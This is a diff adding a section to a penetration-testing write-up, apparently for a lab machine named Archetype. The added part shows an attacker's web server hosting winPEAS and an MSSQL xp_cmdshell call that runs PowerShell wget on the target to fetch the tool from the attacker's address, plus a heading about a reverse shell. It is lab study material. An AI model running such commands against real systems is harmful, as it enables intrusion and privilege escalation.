@@ -117,5 +117,42 @@ archetype\sql_svc
 NULL   
 ```
 
+
+## Upload winpeas
+```
+### Attacker - set up a web server
+┌──(kali㉿kali)-[/usr/share/peass/winpeas]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.156.174 - - [17/Aug/2025 11:32:35] "GET /winPEASx64.exe HTTP/1.1" 200 -
+
+# Target - download winpeas from the attacker
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -c cd C:\Users\Public; wget http://10.10.16.11/winPEASx64.exe -o winpeas.exe';
+output   
+------   
+NULL     
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -c cd C:\Users\Public; ls';
+output                                                                                                                    
+-----------------------------------------------------------------------------------------------------------------------   
+NULL                                                                                                                      
+
+NULL                                                                                                                      
+
+    Directory: C:\Users\Public                                                                                            
+
+NULL                                                                                                                      
+
+NULL                                                                                                                      
+
+Mode                LastWriteTime         Length Name                                                                     
+
+----                -------------         ------ ----                                                                     
+
+<SNIP>                                                                 
+
+-a----        8/17/2025  10:29 AM       10155520 winpeas.exe  
+```
 ## Attempting a reverse shell
 - https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html
